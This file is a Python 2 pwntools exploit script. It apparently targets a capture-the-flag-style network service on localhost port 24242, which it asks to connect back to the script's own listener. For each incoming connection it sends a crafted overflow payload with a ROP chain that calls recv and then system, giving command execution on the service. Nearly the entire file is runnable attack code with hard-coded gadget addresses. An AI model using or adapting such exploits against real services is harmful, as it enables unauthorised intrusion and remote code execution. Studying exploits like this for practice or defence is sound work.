#!/usr/bin/python
import socket

from pwn import *
from struct import pack

# server deets
REMOTE_SERVER = "localhost"
REMOTE_PORT = 24242


def setup_server():
	response_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# try:
	response_server.settimeout(3)
	response_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	response_server.bind(('0.0.0.0',0))
	server_name, server_port = response_server.getsockname()
	print "Starting responder: {name}:{port}".format(name=server_name, port=server_port)
	response_server.listen(5)
	return response_server, server_port
	# except:
	# 	print "failed"
	# 	return None

def initial_request(numThreads, response_port):
	"""
		Send the initiating request to the server
		sends: <number of threads> <port to connect back on>
	"""
	conn = socket.create_connection([REMOTE_SERVER, REMOTE_PORT])
	try:
		conn.send(pack("<HH", numThreads, response_port))
		return conn
	except:
		print "Failed to communicate with server"
		return None
		pass

def accept_connection(response_server):
	conn, client_addr = response_server.accept()
	print "Connected:{0}".format(client_addr)
	return conn


def gen_payload():
		payload = ""
		payload += struct.pack('<H',0x1)
		payload += struct.pack('<H',0x40)
		payload += p32(0x400)
		payload += "\xff"*(0x40)
		# payload += struct.pack('<B',0x84)
		payload += "\x84"
		payload += struct.pack('>I',0xff)
		payload += "E"
		payload += "EEE"
		payload += "A"*(0x1af-157-50-4)
		rop = ""
		rop += p32(0x8048A10) # recv
		rop += p32(0x08049768) # pops
		rop += p32(0x4)
		rop += p32(0x804c0d0)
		# rop += p32(len(sc))
		rop += p32(0x0)
		rop += p32(0x0)
		rop += p32(0x80488E0) # system
		rop += p32(0x08049768+3)
		rop += p32(0x804c0d0)
		rop += p32(0x8049678)
		payload += rop
		payload += "A"*(157+50+4-len(rop))
		payload += "\x80"
		payload += "A"*(0x250)
		return payload

# initialisation stuff
numThreads = 100
response_server, server_port = setup_server()
server = initial_request(numThreads, server_port)



payloads = [
	gen_payload()
    # "A"*(127 + 5 + 10 + 1 + 100),
    # "A"*(127) + "\x84\x7f\xff\xff\xff" + 'A'*10 + "0x80",
    # "E"*(10)
]

format_payload = lambda c: "\x01\x00"+p16(0x0004)+p32(len(c) + 5) + "A"*4 + '\x84' + p32(len(c),endian='big') + c

for x in range(numThreads):
	conn = accept_connection(response_server)
	# payload = payloads[x%len(payloads)]
	conn.send(gen_payload())
	print conn.recv(1024)








